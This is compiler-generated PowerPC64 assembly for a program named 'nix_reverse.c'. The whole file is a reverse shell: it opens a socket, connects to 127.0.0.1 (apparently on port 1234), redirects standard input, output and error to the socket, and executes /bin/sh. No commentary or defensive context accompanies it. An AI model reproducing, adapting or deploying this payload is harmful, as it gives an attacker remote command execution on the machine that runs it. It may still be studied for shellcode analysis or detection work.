	.file	"nix_reverse.c"
	.abiversion 2
	.section	".toc","aw"
	.section	".text"
	.section	.text.startup,"ax",@progbits
	.align 2
	.globl main
	.type	main, @function
main:
0:	addis 2,12,.TOC.-0b@ha
	addi 2,2,.TOC.-0b@l
	.localentry	main,.-main
	mflr 0
	std 31,-8(1)
	li 4,1
	li 5,0
	li 3,2
	std 0,16(1)
	stdu 1,-80(1)
	bl socket
	nop
	li 9,2
	li 5,16
	addi 4,1,32
	sth 9,32(1)
	li 9,-11772
	mr 31,3
	sth 9,34(1)
	lis 9,0x100
	ori 9,9,127
	std 9,36(1)
	bl connect
	nop
	li 4,0
	mr 3,31
	bl dup2
	nop
	li 4,1
	mr 3,31
	bl dup2
	nop
	li 4,2
	mr 3,31
	bl dup2
	nop
	addis 3,2,.LC0@toc@ha
	li 9,0
	addi 3,3,.LC0@toc@l
	addi 4,1,48
	li 5,0
	std 9,56(1)
	std 3,48(1)
	bl execve
	nop
	addi 1,1,80
	li 3,0
	b _restgpr0_31
	.long 0
	.byte 0,0,0,1,128,1,0,0
	.size	main,.-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/bin/sh"
	.ident	"GCC: (Debian 4.9.2-10) 4.9.2"
	.section	.note.GNU-stack,"",@progbits
